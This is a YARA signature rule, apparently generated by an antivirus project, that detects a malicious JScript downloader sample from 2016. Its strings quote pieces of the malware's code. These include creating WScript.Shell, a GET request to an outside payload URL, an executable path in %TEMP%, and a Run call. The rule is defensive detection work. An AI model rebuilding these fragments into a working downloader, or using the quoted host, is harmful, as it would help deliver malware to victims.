rule sig_20160329_17d9202d6fa65414fa630ef3f2d831a8 {
  meta:
    description = "datamaliciousorder - file 20160329_17d9202d6fa65414fa630ef3f2d831a8.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6809aaefa33f07bba517bc8f56405706881225c162e548fa27a3521ab8237dd5"

  strings:
    $s1  = "function Kipilsfn() {return Sfkpginaie[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"5h4gLvUd0m.exe\";};" fullword ascii
    $s2  = "Ysddls[Wuuibttds](\"GET\", \"http://dukeplasticslab.com/j47akfa\", false);" fullword ascii
    $s3  = "do {WScript[Xbwkyay](Uiyllid() * 11)} while (Ysddls[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Sfkpginaie = function Xtpplbaq() {return WScript[Hohyreeaaz](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Qjpbyrfvl(Hjlwhxtmdd, Sufrvbaiz){return Hjlwhxtmdd - Sufrvbaiz;};" fullword ascii
    $s6  = "function Wnhjdmjag(Kpfdhlmc){Sfkpginaie[\"Run\"](Kpfdhlmc, Xjgcvln, Xjgcvln);};" fullword ascii
    $s7  = "function Vykvl()" fullword ascii
    $s8  = "var Oihta = false;" fullword ascii
    $s9  = "var Xijnpnwpq = false;" fullword ascii
    $s10 = "function Atczx(Owuhfnjjb) {var Xtuaqzp = (1, 2, 3, 4, 5, Owuhfnjjb); return Xtuaqzp;};" fullword ascii
    $s11 = "function Gdkjm(){return Oqzqowmamj;};" fullword ascii
    $s12 = "var Rlbxhqtwn = new this[\"Date\"]();" fullword ascii
    $s13 = "function Uiyllid(){return 22;};" fullword ascii
    $s14 = "function Rlgcbyvu(){return Hohyreeaaz;};" fullword ascii
    $s15 = "var Womxvmxjf = false;" fullword ascii
    $s16 = " while (Wuuyjq){" fullword ascii
    $s17 = "Oihta = true; " fullword ascii
    $s18 = "return Qjpbyrfvl(Uzlnwie, Wfvkwivpq);" fullword ascii
    $s19 = "Womxvmxjf = true; " fullword ascii
    $s20 = "function Calxysm() {return ((Womxvmxjf == true) && (Womxvmxjf == Oihta)) ? 1 : Xjgcvln;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}